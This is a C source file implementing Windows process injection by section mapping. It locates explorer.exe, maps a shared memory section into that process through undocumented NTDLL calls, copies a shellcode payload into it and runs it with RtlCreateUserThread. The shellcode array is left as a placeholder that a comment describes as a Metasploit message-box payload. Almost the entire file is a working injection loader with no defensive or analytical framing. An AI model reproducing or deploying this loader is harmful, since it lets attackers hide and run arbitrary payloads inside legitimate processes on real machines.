
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// 64-bit shellcode to display messagebox, generated using Metasploit on Kali Linux
unsigned char shellcodePayload[X] = {
// hexa content
};

unsigned int lengthOfShellcodePayload = X;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; 
	PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


typedef NTSTATUS (NTAPI * NtCreateSection_Ptr)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 


typedef NTSTATUS (NTAPI * NtMapViewOfSection_Ptr)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	
	
typedef FARPROC (WINAPI * RtlCreateUserThread_Ptr)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);
	
int SearchForProcess(const char *processName) {

        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
                CloseHandle(hSnapshotOfProcesses);
                return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
                        pid = processStruct.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshotOfProcesses);
                
        return pid;
}

// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section in local process
	NtCreateSection_Ptr pNtCreateSection = (NtCreateSection_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_Ptr pNtMapViewOfSection = (NtMapViewOfSection_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// copy the payload into the section
	memcpy(pLocalView, payload, payload_len);
	
	// create remote view (in target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	printf("Addresses: payload = %p ; RemoteView = %p ; LocalView = %p\n", payload, pRemoteView, pLocalView);
	printf("Press Enter to Continue\n");
	getchar();

	// execute the payload
	RtlCreateUserThread_Ptr pRtlCreateUserThread = (RtlCreateUserThread_Ptr) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}

int main(void) {
	int pid = 0;
    HANDLE hProcess = NULL;

	pid = SearchForProcess("explorer.exe"); // or anyother program you wanna target

	if (pid) {
		printf("explorer.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProcess != NULL) {
			InjectVIEW(hProcess, shellcodePayload, lengthOfShellcodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
}
